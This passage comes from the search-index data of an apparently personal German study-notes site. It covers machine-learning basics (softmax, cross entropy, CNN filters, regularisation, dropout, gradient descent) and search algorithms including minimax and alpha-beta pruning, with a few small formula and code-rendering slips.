Wahrscheinlichkeitsverteilung"},{"location":"studium/AI/AI-Zusammenfassung/#3-cross-entropy-loss","title":"\ud83d\udd25 3. Cross Entropy Loss","text":"<p>Misst den Fehler, wenn ein neuronales Netz eine Klasse vorhersagen soll. Formel (bei einer Klasse 1):</p> <p>$$ \\text{Loss} = -\\log(\\text{p}) $$ - <code>p</code> ist die vorhergesagte Wahrscheinlichkeit f\u00fcr die richtige Klasse - Je n\u00e4her <code>p</code> an 1 \u2192 kleiner Verlust - Je n\u00e4her <code>p</code> an 0 \u2192 sehr gro\u00dfer Verlust</p> <p>\ud83d\udccc Beispiel: Die wahre Klasse ist Katze. Das Modell sagt mit 90\u202f%: \u201eDas ist eine Katze.\u201c \u2192 Guter Wert, niedriger Fehler Sagt es nur 10\u202f%: \u2192 hoher Fehler, obwohl \u201eKatze\u201c korrekt ist!</p> Funktion Aufgabe Beispiel Softmax Macht aus Zahlen Wahrscheinlichkeiten <code>[2.0, 1.0, 0.1] \u2192 [0.65, 0.24, 0.11]</code> Cross Entropy Vergleicht Vorhersage mit echter Klasse <code>loss([0.65, 0.24, 0.11], [0, 1, 0])</code> = gro\u00dfer Fehler"},{"location":"studium/AI/AI-Zusammenfassung/#schritt-1-softmax","title":"\u2705 Schritt 1: Softmax","text":"<p>Macht aus den Roh-Ausgaben des Netzes (auch \u201eLogits\u201c genannt) Wahrscheinlichkeiten f\u00fcr jede Klasse.</p> <p>\ud83d\udccc Beispiel:</p> <p>Roh-Ausgabe vom Netz (z.\u202fB. letzte Schicht, noch keine Wahrscheinlichkeiten):</p> <p><code>[2.5, 1.0, -0.5]</code></p> <p>Softmax wandelt das um:</p> <p><code>[0.78, 0.18, 0.04]</code></p> <p>\u27a1 Das Netz \u201eglaubt\u201c:</p> <ul> <li>Klasse 0 mit 78\u202f%</li> <li>Klasse 1 mit 18\u202f%</li> <li>Klasse 2 mit 4\u202f%</li> </ul>"},{"location":"studium/AI/AI-Zusammenfassung/#schritt-2-cross-entropy","title":"\u2705 Schritt 2: Cross Entropy","text":"<p>Vergleicht diese Wahrscheinlichkeiten mit der richtigen Klasse (One-Hot)</p> <p>\ud83d\udccc Beispiel: Die wahre Klasse war Klasse 1 \u2192 One-Hot: <code>[0, 1, 0]</code> Cross Entropy Loss schaut dann auf den Wert bei der 1 (Klasse 1): \\(\\text{Loss} = -\\log(0.18) \\approx 1.714\\)</p> <p>\u2192 Das Netz hat nicht besonders gut geraten \u2192 also hoher Fehler \u2192 je h\u00f6her die Vorhersage f\u00fcr die richtige Klasse, desto niedriger der Verlust</p>"},{"location":"studium/AI/AI-Zusammenfassung/#3-cnn-vs-fully-connected-layer","title":"\ud83d\udfe3 3. CNN vs. Fully Connected Layer","text":""},{"location":"studium/AI/AI-Zusammenfassung/#was-ist-overfitting","title":"\ud83d\udd25 Was ist Overfitting?","text":"<p>Overfitting bedeutet, dass dein Modell die Trainingsdaten zu gut auswendig gelernt hat, aber auf neuen Daten schlecht funktioniert.</p>"},{"location":"studium/AI/AI-Zusammenfassung/#was-hilft-gegen-overfitting","title":"\ud83d\udee0 Was hilft gegen Overfitting?","text":"<ul> <li>Mehr Daten</li> <li>Dropout \u2192 zuf\u00e4lliges Abschalten von Neuronen beim Training</li> <li>Regularisierung (z.\u202fB. L2)</li> <li>Batch-Normalisierung</li> <li>Fr\u00fches Stoppen (Early Stopping)</li> <li>Datenaugmentation (z.\u202fB. Bilder leicht kippen, drehen, spiegeln, um mehr Vielfalt zu schaffen)</li> </ul>"},{"location":"studium/AI/AI-Zusammenfassung/#fully-connected-fc","title":"\ud83d\udd39 Fully Connected (FC)","text":"<ul> <li>Jedes Neuron ist mit allen Neuronen der n\u00e4chsten Schicht verbunden</li> <li>Viele Parameter \u2192 hohe Rechenlast</li> <li>Keine R\u00fccksicht auf r\u00e4umliche Struktur (z.\u202fB. bei Bildern)</li> </ul> <p>\ud83d\udccc Beispiel: Eingabebild mit 784 Pixeln (28\u00d728) \u2192 100 Neuronen \u2192 78.400 Gewichte!</p>"},{"location":"studium/AI/AI-Zusammenfassung/#cnn-convolutional-neural-network","title":"\ud83d\udd39 CNN (Convolutional Neural Network)","text":"<ul> <li>Nutzt Filter, die \u00fcber das Bild \u201ewandern\u201c (Faltung)</li> <li>Erkennen Kanten, Texturen, Formen</li> <li>Weniger Parameter - z.\u202fB. 10 Filter \u00e0 3\u00d73 = 90 Gewichte</li> </ul> <p>\ud83d\udccc Vorteil:</p> <ul> <li>CNNs erkennen lokale Muster (z.\u202fB. Augen in Gesichtern)</li> <li>Weniger Overfitting</li> <li>Besser f\u00fcr Bilder geeignet</li> </ul> <p>Stell dir vor, du hast ein sehr kleines Bild (z.\u202fB. Graustufen, 5\u00d75 Pixel):</p>"},{"location":"studium/AI/AI-Zusammenfassung/#bild-input-matrix","title":"\ud83d\udcf7 Bild (Input-Matrix)","text":"<pre><code>1  2  3  0  1\n4  5  6  1  0\n7  8  9  0  1\n1  2  3  4  5\n0  1  2  3  4\n</code></pre> <p>Und du hast einen Filter, der Kanten in horizontaler Richtung erkennt. Der sieht z.\u202fB. so aus:</p>"},{"location":"studium/AI/AI-Zusammenfassung/#filter-33-matrix","title":"\ud83e\udde9 Filter (3\u00d73 Matrix)","text":"<pre><code>-1 -1 -1\n 0  0  0\n 1  1  1\n</code></pre> <p>Das ist ein sogenannter Sobel-Filter, der horizontale Kanten erkennt (oben dunkel, unten hell \u2192 z.\u202fB. Augenbraue \u00fcber Auge).</p>"},{"location":"studium/AI/AI-Zusammenfassung/#was-passiert-jetzt","title":"\ud83d\udd01 Was passiert jetzt?","text":"<p>Der Filter \u201ewandert\u201c \u00fcber das Bild, von links nach rechts, oben nach unten, immer 3\u00d73 Ausschnitte. Bei jedem Schritt wird:</p> <ol> <li>Das Filterelement mit dem Bildausschnitt multipliziert</li> <li>Die Produkte werden aufsummiert</li> <li>Das ergibt einen Pixel im Ausgabebild</li> </ol>"},{"location":"studium/AI/AI-Zusammenfassung/#beispiel-schritt-1-linke-obere-ecke","title":"\ud83d\udd0d Beispiel-Schritt 1 (linke obere Ecke):","text":"<p>Der 3\u00d73-Ausschnitt aus dem Bild:</p> <pre><code>1  2  3\n4  5  6\n7  8  9\n</code></pre> <p>Multipliziert mit dem Filter (elementweise):</p> <p><code>1*-1 + 2*-1 + 3*-1 + 4*0 + 5*0 + 6*0 + 7*1 + 8*1 + 9*1 = -1 -2 -3 + 0 + 0 + 0 + 7 + 8 + 9 = **18**</code></p> <p>\u2192 Das ist der erste Pixel im Output-Bild</p> <pre><code>18  X  X\nX   X  X\nX   X  X\n</code></pre>"},{"location":"studium/AI/AI-Zusammenfassung/#fazit","title":"\ud83d\udca1 Fazit:","text":"<p>Ein CNN-Filter ist eine kleine Matrix (z.\u202fB. 3\u00d73), die lokal \u00fcber das Bild l\u00e4uft und wichtige Muster erkennt, z.\u202fB. Kanten. Das Netz lernt im Training selbst, welche Filter am besten funktionieren.</p>"},{"location":"studium/AI/AI-Zusammenfassung/#5-batch-normierung","title":"\ud83e\udde0 5. Batch-Normierung","text":"<ul> <li>Standardisiert Eingaben pro Mini-Batch</li> <li>Vorteil: schnelleres &amp; stabileres Training</li> <li>Formel: $$  x' = \\frac{x - \\text{Mittelwert}}{\\text{Standardabweichung} + \\varepsilon} \\quad\\Rightarrow\\quad BN(x') = \\alpha x' + \\beta $$</li> </ul>"},{"location":"studium/AI/AI-Zusammenfassung/#l1-regularisierung","title":"\ud83d\udd34 L1-Regularisierung","text":""},{"location":"studium/AI/AI-Zusammenfassung/#formel","title":"\ud83e\uddee Formel:","text":"<p>$$ \\text{Loss} = \\text{Fehler} + \\lambda \\cdot \\sum |w| $$ - Bestraft alle Gewichte linear - Hat den Effekt, dass viele Gewichte exakt null werden</p>"},{"location":"studium/AI/AI-Zusammenfassung/#l2-regularisierung-das-ist-die-standard-variante","title":"\ud83d\udd35 L2-Regularisierung (das ist die \u201eStandard\u201c-Variante)","text":""},{"location":"studium/AI/AI-Zusammenfassung/#formel_1","title":"\ud83e\uddee Formel:","text":"\\[ \\text{Loss} = \\text{Fehler} + \\lambda \\cdot \\sum w^2 \\] <ul> <li><code>\u03bb</code> ist ein Parameter, wie stark du die Bestrafung willst</li> <li>Gro\u00dfe Gewichte \u2192 \u00fcberproportional st\u00e4rker bestraft</li> <li>Aber: Gewichte werden nicht null, sondern nur kleiner gehalten</li> </ul> <p>\ud83d\udccc Was passiert? Das Netz verteilt die Verantwortung gleichm\u00e4\u00dfig. Es vermeidet es, dass ein einzelnes Neuron \u201ealles\u201c speichert (und damit \u00fcberfitten kann).</p> Name Auch genannt Bestraft gro\u00dfe \u2026 Effekt Vorteil Nachteil L1 Lasso Absolutwerte Macht Gewichte null Spart Speicher, Feature-Auswahl Eher instabil L2 Ridge Quadrate der Gewichte Macht Gewichte kleiner Glatteres robusteres Lernen Eher tr\u00e4ger Kombination Elastic Net Mischung aus beidem"},{"location":"studium/AI/AI-Zusammenfassung/#6-dropout","title":"\ud83e\uddea 6. Dropout","text":"<ul> <li>In jedem Trainingsschritt: zuf\u00e4llige Neuronen auf 0(deaktiviert)</li> <li>Welche Neuronen deaktiviert werden \u00e4ndert sich in jedem Schritt</li> <li> <p>Damit alle Neuronen einmal drankommen und nicht einzelne zu viel trainiert   werden und zu Superneuronen werden</p> </li> <li> <p>Ziel: Overfitting verhindern, Netzwerk lernt redundante Merkmale1</p> </li> </ul>"},{"location":"studium/AI/AI-Zusammenfassung/#7-analyse-trainierter-cnns","title":"\ud83d\udc41 7. Analyse trainierter CNNs","text":"<ul> <li>CAM (Class Activation Mapping): zeigt, wo das Netz \"hinschaut\"</li> <li>Guided Backpropagation: zeigt, welche Eingabepixel am wichtigsten waren</li> </ul> Begriff Bedeutung Logits Rohwerte vor der Softmax Feature Maps Zwischenergebnisse nach Faltungen (in CNNs) Pooling (z.\u202fB. Max Pooling) Verkleinert Feature Maps, w\u00e4hlt z.\u202fB. gr\u00f6\u00dftes Element aus Regionen Padding / Stride Steuerung, wie Filter \u00fcber Bild laufen"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/","title":"Machine Learning & Neuronale Netze","text":""},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#12-lineare-regression","title":"1.2 Lineare Regression","text":""},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#ziel","title":"\ud83c\udfaf Ziel:","text":"<p>Ein Modell, das eine lineare Beziehung zwischen einer Eingabe XXX und einer Ausgabe yyy findet.</p>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#mathematisches-modell","title":"\ud83d\udcdd Mathematisches Modell:","text":"\\[y=wX+b\\] <ul> <li>X ist die Eingabematrix mit m Beispielen und n Features.</li> <li>w ist der Vektor der Gewichte.</li> <li>b ist der Bias-Wert.</li> </ul>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#fehlermetrik-mean-squared-error-mse","title":"\ud83d\udd22 Fehlermetrik: Mean Squared Error (MSE)","text":"<ul> <li>MSE sagt aus f\u00fcr das Modell was gut oder schlecht ist. $$ MSE=n1\u200b\u2211(y^\u200bi\u200b\u2212yi\u200b)2 $$</li> </ul>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#gradientenabstieg-zur-optimierung","title":"\ud83d\udd3d Gradientenabstieg zur Optimierung","text":"<ul> <li>Berechnen Gradient des Fehlers damit wir wissen in welche Richtung wir uns bewegen m\u00fcssen.</li> <li>Wir \u00e4ndern <code>w</code> und <code>b</code> ein kleines St\u00fcck -&gt; Modell wird besser</li> </ul> \\[w := w - \\alpha \\frac{\\partial J}{\\partial w}$$ $$b := b - \\alpha \\frac{\\partial J}{\\partial b}\\]"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#python-implementierung","title":"\ud83d\udda5\ufe0f Python-Implementierung","text":"<pre><code>import numpy as np\n\n\n\n# Daten generieren\nX = np.array([[1], [2], [3], [4], [5]])\ny = np.array([2, 4, 6, 8, 10])\n\n# Parameter initialisieren\nw = 0.000\nb = 0.000\nalpha = 0.0025 \u00a0# Lernrate\nepochs = 1000\n\n# Listen zum Speichern von \u00c4nderungen\nw_history = []\nb_history = []\n\n# Gradientenabstieg\nfor _ in range(epochs):\n\u00a0 \u00a0 y_pred = w * X.flatten() + b \u00a0# X muss flach sein\n\u00a0 \u00a0 dw = (-2 / len(X)) * np.sum(X.flatten() * (y - y_pred)) \u00a0# Skalar\n\u00a0 \u00a0 db = (-2 / len(X)) * np.sum(y - y_pred) \u00a0# Skalar\n\u00a0 \u00a0 w -= alpha * dw\n\u00a0 \u00a0 b -= alpha * db\n\u00a0 \u00a0 w_history.append(w)\n\u00a0 \u00a0 b_history.append(b)\n\nprint(f\"Trainiertes Modell: y = {w}x + {b}\")\n\nimport matplotlib.pyplot as plt\n\nplt.scatter(X, y, label=\"Daten\")\nplt.plot(X, w*X + b, color='red', label=\"Regressionslinie\")\nplt.legend()\nplt.show()\n</code></pre>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#das-ganze-nochmal-ganz-bildlich","title":"\ud83d\udd01 Das Ganze nochmal ganz bildlich:","text":"<p>Stell dir vor, dein Modell steht auf einem Berg aus Fehlern.</p> <ul> <li>Oben: Schlechter Fehler (gro\u00df)</li> <li>Unten: Kleiner Fehler (gut)</li> </ul> <p>\ud83d\udc49 Der MSE sagt dir, wie hoch du gerade bist. \ud83d\udc49 Der Gradient sagt dir, in welche Richtung du runterlaufen musst. \ud83d\udc49 Der Gradientenabstieg ist das Laufen.</p>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#wie-die-beiden-zusammenspielen","title":"\ud83e\udde0 Wie die beiden zusammenspielen:","text":"<ol> <li>Du machst eine Vorhersage mit deinem aktuellen Modell.</li> <li>Du berechnest den MSE \u2192 Wie schlecht ist das?</li> <li>Du berechnest den Gradienten des Fehlers \u2192 In welche Richtung m\u00fcssen wir <code>w</code> und <code>b</code> \u00e4ndern?</li> <li>Du \u00e4nderst <code>w</code> und <code>b</code> ein kleines St\u00fcck \u2192 Modell wird besser.</li> <li>Wiederhole das viele Male \u2192 und du bekommst ein Modell, das sehr gute Vorhersagen macht!</li> </ol>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#beispielcode-gradient-und-lernrate","title":"\ud83d\udd01 Beispielcode: Gradient und Lernrate","text":"<pre><code>a_ = -0,5\na_history = -0.5\neta = 0.0003\nfor i in range(0,5):\n\u00a0 grad_a = -2/len(y)*np.sum((y -a_ * x - b) *x)\n\u00a0 a_ = a_ - eta*grad_a\n\u00a0 a_history =np.append(a_history,a_)\nprint(a_history)\n</code></pre> <p>Zeigt den Verlauf wie sich unser Modell verbessert.</p> <p><code>[-0.5 1.80415034 0.80054605 1.23767972 1.04728007 1.13021135]</code></p> <ul> <li>a_ := Startwert</li> <li>eta := Ist die Lernrate(In wie gro\u00dfe Abst\u00e4nden gesprungen wird)         - (Hohe Lernrate = Schneller, aber ungenauer)         - (Kleine Lernrate = Langsamer, aber ziemlich genau)</li> </ul> <p>Probem: Finde eine gute Lernrate     - Idee: Adaptive Learning Rate(Passe die Lernrate an zB nach 5 Durchl\u00e4ufen oder andere Bedingungen) zB:</p>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#dynamische-lernrate-heuristik","title":"\ud83d\ude80 Dynamische Lernrate (Heuristik)","text":"<p>Idee: - Anfangs: Gro\u00dfe Lernrate \u2192 schnelleres Lernen - Sp\u00e4ter: Kleinere Lernrate \u2192 feinere Anpassung</p>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#beispiel-alle-20-elemente-eta-halbieren","title":"Beispiel: Alle 20 Elemente eta halbieren","text":"<pre><code>eta = 0.1\nfor i in range(100):\n    grad_a = ... # wie \u00fcblich\n    a_ = a_ - eta * grad_a\n\n    if i % 20 == 0:\n        eta = eta * 0.5  # Lernrate halbieren\n</code></pre> \u27a1\ufe0f So verhinderst du \u00dcberschwinger und machst das Modell pr\u00e4ziser"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#beispiel-wenn-sich-der-gradient-kaum-noch-andert-lernrate-verringern","title":"Beispiel: Wenn sich der Gradient kaum noch \u00e4ndert \u2192 Lernrate verringern","text":"<pre><code># Wenn sich der Gradient kaum noch \u00e4ndert \u2192 Lernrate verringern\nif abs(grad_a) &lt; 0.01:\n    eta = eta * 0.5\n</code></pre> \u27a1\ufe0f Das w\u00e4re eine einfache Heuristik: \u201eWenn kaum noch Verbesserung \u2192 langsamer werden\u201c"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#9-dropout","title":"9. \ud83c\udfb2 Dropout","text":""},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#wofur-braucht-man-das","title":"Wof\u00fcr braucht man das?","text":"<ul> <li>Gegen Overfitting</li> <li>L\u00e4sst Netzwerk robuster und generalisierender lernen</li> </ul>"},{"location":"studium/AI/Machine%20Learning%20%26%20Neuronale%20Netze/#wie-setzt-man-es-ein","title":"\ud83d\udee0\ufe0f Wie setzt man es ein?","text":"<ul> <li>W\u00e4hrend Training: zuf\u00e4llig z.\u202fB. 50\u202f% der Neuronen deaktivieren</li> <li>W\u00e4hrend Test: volle Kapazit\u00e4t aktivieren</li> </ul>"},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/","title":"Adversariale Suche &amp; Minimax","text":"","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#adversariale-suche-minimax","title":"Adversariale Suche &amp; Minimax","text":"","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#1-spielbaum-rollen","title":"\ud83c\udfae 1\ufe0f\u20e3 Spielbaum &amp; Rollen","text":"<ol> <li> <p>Spielbaum </p> <ul> <li>Jeder Knoten = eine Spielsituation.  </li> <li>Kanten = m\u00f6gliche Z\u00fcge.</li> </ul> </li> <li> <p>Max\u2011 vs. Min\u2011Knoten </p> <ul> <li>Max (unsere KI) will die Bewertung maximieren.  </li> <li>Min (Gegner) will sie minimieren.</li> </ul> </li> <li> <p>Blatt\u2011Bewertung Tiefe erreicht oder Spielende \u2192 Heuristik liefert einen Zahlenwert \\(E(s)\\)</p> </li> </ol>","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#2-minimaxverfahren","title":"\ud83e\udd16 2\ufe0f\u20e3 Minimax\u2011Verfahren","text":"<ol> <li> <p>Rekursion </p> <ul> <li>Wechsle abwechselnd zwischen Max und Min, bis Tiefe\u00a00 oder terminal.</li> </ul> </li> <li> <p>Entscheidung </p> <ul> <li>Max nimmt <code>max(\u2026)</code> \u00fcber alle Kinder\u2011Werte.  </li> <li>Min nimmt <code>min(\u2026)</code>.</li> </ul> </li> <li> <p>Komplexit\u00e4t </p> </li> <li>Zeit: \\(O(b^d)\\) mit Verzweigungsfaktor \\(b\\) und Tiefe \\(d\\)</li> <li>Platz: \\(O(d)\\) (Rekursionstiefe)</li> </ol> <p></p> \ud83d\udd0d Pseudo-Code-MiniMax <pre><code>    function minimax(s, d, player):\n      if d=0 oder s terminal: return E(s)\n      if player=Max:\n        best = \u2212\u221e\n        for Zug z in s: best = max(best, minimax(s nach z, d\u22121, Min))\n        return best\n      else:\n        best = +\u221e\n        for Zug z in s: best = min(best, minimax(s nach z, d\u22121, Max))\n        return best\n</code></pre>","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#zusammenfassung-minimax","title":"\ud83d\udcdd Zusammenfassung Minimax","text":"Begriff Beschreibung Max\u2011Knoten w\u00e4hlt das gr\u00f6\u00dfte Kind &gt;&gt;&gt; Min\u2011Knoten w\u00e4hlt das kleinste Kind &lt;&lt;&lt; E(s) Bewertungsfunktion an den \u201eBl\u00e4ttern\u201c Parameter sss: Stellung, ddd: Tiefe, player\u2208{Max,Min}player\\in{Max,Min}player\u2208{Max,Min}","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#3-alphabetapruning","title":"\u2702\ufe0f 3\ufe0f\u20e3 Alpha\u2011Beta\u2011Pruning","text":"<ol> <li> <p>\u03b1 (Alpha) </p> <ul> <li>Beste bisher bekannte Bewertung f\u00fcr Max.</li> </ul> </li> <li> <p>\u03b2 (Beta) </p> <ul> <li>Beste bisher bekannte Bewertung f\u00fcr Min.</li> </ul> </li> <li> <p>Pruning\u2011Kriterium     Sobald \\(\\beta \\le \\alpha\\) gilt, kann der Rest des Teilbaums abgebrochen werden.</p> </li> <li> <p>Vorteil Im besten Fall: \\(O(b^{\\frac{d}{2}})\\) statt \\(O(b^d)\\)</p> </li> </ol> <p></p> \ud83d\udd0d Pseudo-Code-MiniMax mit Alpha Beta Pruning <pre><code>    function alphabeta(s, d, \u03b1, \u03b2, player):\n      if d=0 oder s terminal: return E(s)\n      if player=Max:\n        v = \u2212\u221e\n        for Zug z:\n          v = max(v, alphabeta(s nach z, d\u22121, \u03b1, \u03b2, Min))\n          \u03b1 = max(\u03b1, v)\n          if \u03b2 \u2264 \u03b1: break\n        return v\n      else:\n        v = +\u221e\n        for Zug z:\n          v = min(v, alphabeta(s nach z, d\u22121, \u03b1, \u03b2, Max))\n          \u03b2 = min(\u03b2, v)\n          if \u03b2 \u2264 \u03b1: break\n        return v\n</code></pre>","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#kurzzusammenfassung","title":"\ud83d\udcdd Kurzzusammenfassung \u03b1\u03b2","text":"Symbol Bedeutung \u03b1 Max\u2019s bisher beste Option (untere Schranke) \u03b2 Min\u2019s bisher beste Option (obere Schranke) Pruning Wenn \u03b2\u2264\u03b1\\beta \\le \\alpha\u03b2\u2264\u03b1, keine weitere Expansion n\u00f6tig","tags":["Course/"]},{"location":"studium/AI/Minimax%20und%20Alpha%2C%20Beta%20Pruning/#4-heuristische-zugreihenfolge-move-ordering","title":"4. Heuristische Zugreihenfolge (Move Ordering)","text":"<p>Um Alpha\u2011Beta effektiver zu machen, sollten \u201egute\u201c Z\u00fcge zuerst untersucht werden, damit Schnittkriterien fr\u00fcher greifen:</p> <ul> <li>Kaptur\u2011Z\u00fcge: Z\u00fcge, die einen Eroberungszug ausl\u00f6sen, oft hohe Bewertung \u2192 Priorit\u00e4t.</li> <li>Bonus\u2011Z\u00fcge: Z\u00fcge, die in die eigene Kalah enden und einen weiteren Zug erlauben.</li> <li>\u201cKiller\u2011Moves\u201d: Aus fr\u00fcheren Knoten gespeicherte besonders stark prunende Z\u00fcge.</li> <li>Partial\u2011Evaluator: Kurze, schnelle Heuristik, um Z\u00fcge vorab grob zu bewerten und zu sortieren.</li> </ul> <p>Mit guter Zugreihenfolge n\u00e4hert sich die Laufzeit \\(O(b^\\frac{d}{2})\\)</p> <p>im Durchschnitt an.</p>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/","title":"Problem L\u00f6sen durch Suche","text":"","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#problemlosen-durch-suchen-was-steckt-wirklich-dahinter","title":"\ud83e\udde0 \"Probleml\u00f6sen durch Suchen\" - Was steckt wirklich dahinter?","text":"","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#1-was-ist-ein-suchproblem-uberhaupt","title":"1. \ud83d\udd0d Was ist ein Suchproblem \u00fcberhaupt?","text":"<p>Du hast ein Problem und suchst eine L\u00f6sung \u2192 Beispiel: Bauer will Ziege, Kohl und Wolf \u00fcber den Fluss bringen, ohne dass sich jemand gegenseitig frisst.</p> <p>Um das als Suchproblem zu l\u00f6sen, braucht man:</p> Begriff Bedeutung Zustand Wie die Welt gerade aussieht (z.\u202fB. \u201eZiege ist links\u201c). Startzustand Ausgangspunkt (z.\u202fB. alles ist auf der linken Seite). Zielzustand Wunschzustand (z.\u202fB. alles ist sicher rechts angekommen). Aktionen Was kann man tun? (z.\u202fB. \u201eBauer f\u00e4hrt mit Wolf nach rechts\u201c). \u00dcberg\u00e4nge Durch eine Aktion \u00e4ndert sich der Zustand. Kosten Manche Wege kosten mehr (z.\u202fB. Sprit, Zeit\u2026). <p>\u27a1\ufe0f Daraus entsteht ein Zustandsraum, also eine Art riesiges Entscheidungsdiagramm.</p>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#2-wie-wird-das-problem-gelost","title":"2. \ud83c\udf33 Wie wird das Problem gel\u00f6st?","text":"<p>Durch Suche im Zustandsraum - du startest beim Ausgangspunkt und probierst Aktionen aus, um ans Ziel zu kommen.</p> <p>Man unterscheidet zwei Arten von Suchen:</p>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#uninformierte-suche-blinde-suche","title":"\ud83d\udd35 Uninformierte Suche (blinde Suche)","text":"<p>Du hast keinen Plan, was dich dem Ziel n\u00e4her bringt. Beispiele:</p> Verfahren Beschreibung Breitensuche Geht systematisch Ebene f\u00fcr Ebene durch (wie Schlange stehen). Tiefensuche Geht so tief wie m\u00f6glich - oft schnell, aber verirrt sich gern. Tiefenbeschr\u00e4nkte Suche Wie Tiefensuche, aber mit Sicherheitsgrenze. Iterativ vertiefende Suche Kombi aus beiden: startet flach und geht schrittweise tiefer. Uniforme Kostensuche W\u00e4hlt immer den g\u00fcnstigsten Weg (z.\u202fB. wenig Benzinverbrauch). <p>\ud83e\uddee Bewertungskriterien f\u00fcr Suchalgorithmen:</p> <ul> <li>Vollst\u00e4ndig - Findet der Algo eine L\u00f6sung, wenn es eine gibt?</li> <li>Optimal - Ist es die beste L\u00f6sung (z.\u202fB. der k\u00fcrzeste Weg)?</li> <li>Zeitkomplexit\u00e4t - Wie lange dauert das Ganze?</li> <li>Speicherbedarf - Wie viel RAM/Platz wird gebraucht?</li> </ul>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#informierte-suche-mit-kopfchen","title":"\ud83d\udfe2 Informierte Suche (mit K\u00f6pfchen!)","text":"<p>Hier hat der Algorithmus eine Heuristik - eine Art \u201eRiecher\u201c f\u00fcr gute Entscheidungen.</p>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#was-ist-eine-heuristik-einfach-erklart","title":"\u2705 Was ist eine Heuristik (einfach erkl\u00e4rt)?","text":"<p>Eine Heuristik ist eine Hilfsmethode, die dir hilft, schnell eine gute Entscheidung zu treffen, ohne alles durchzuprobieren.</p> <p>Beispiele:</p> Verfahren Beschreibung Gierige Suche Immer zum Knoten, der dem Ziel am n\u00e4chsten scheint (z.\u202fB. Luftlinie). A*-Suche Kombiniert den Weg, den man schon gemacht hat g(n) + den gesch\u00e4tzten Restweg h(n) \u2192 f(n) = g(n) + h(n). <p>\ud83d\udccc Wichtig: Gute Heuristiken = kluge Tipps, welche Wege sich lohnen \u2192 spart mega viel Rechenzeit!</p>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#3-beispiele-aus-dem-alltag","title":"3. \ud83e\uddf9 Beispiele aus dem Alltag","text":"<ul> <li>Staubsaugerwelt: Der Bot soll alles sauber machen \u2192 Suchproblem!</li> <li>15-Puzzle: Schiebe ein Feld leer und sortiere die Zahlen \u2192 Zust\u00e4nde!</li> <li>Sudoku / Kartenf\u00e4rbung: Kann als sogenanntes \u201eConstraint Satisfaction Problem\u201c formuliert werden.</li> <li>Stra\u00dfenkarte: Finde den k\u00fcrzesten Weg von A nach B.</li> </ul>","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#fazit","title":"\ud83e\udde9 Fazit:","text":"<p>\u201eProbleml\u00f6sen durch Suchen\u201c ist im Grunde ein cleveres Durchprobieren von M\u00f6glichkeiten - mit oder ohne Plan.</p> <p>Eine uninformierte Suche ist ein \u201edummer\u201c Algorithmus - er hat keine Ahnung, wo das Ziel ist, sondern folgt nur stur seiner Suchstruktur (z.\u202fB. Breitensuche, Tiefensuche).</p> <p>Ein Algorithmus, der Heuristiken nutzen kann, ist informiert - er kann mit Hilfsmethoden und Zusatzinfos gef\u00fcttert werden, um kl\u00fcger, gezielter und oft schneller zum Ziel zu kommen.</p> Ohne Plan \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Mit Plan \ud83e\udde0 Uninformierte Suche Informierte Suche Probieren alles durch Probieren \u201eschlaue\u201c Wege zuerst Langsamer Effizienter, wenn Heuristik gut ist ### \ud83d\udd0d Vergleich von Suchalgorithmen in Bezug auf Heuristik Algorithmus Heuristik? Speicherbedarf Optimal? Komplett? Geschwindigkeit Bemerkung BFS \u274c Nein Hoch \u2705 Ja \u2705 Ja Langsam Optimal bei gleicher Kosten pro Schritt DFS \u274c Nein Niedrig \u274c Nein \u274c Nein Schnell (aber oft falsch) Kann sich in Sackgassen verlaufen IDS \u274c Nein Niedrig \u2705 Ja \u2705 Ja Langsam Kombination aus DFS &amp; BFS - platzsparend Uniform Cost Search \u274c Nein Hoch \u2705 Ja \u2705 Ja Mittel Wie A* ohne Heuristik A* \u2705 Ja Hoch \u2705 Ja \u2705 Ja Schnell (mit guter Heuristik) Goldstandard f\u00fcr viele KI-Probleme Greedy Best-First \u2705 Ja Mittel \u274c Nein \u274c Nein Sehr schnell Oft nicht optimal - gierig eben \ud83d\ude05 IDA* \u2705 Ja Niedrig \u2705 Ja \u2705 Ja Etwas langsamer als A* 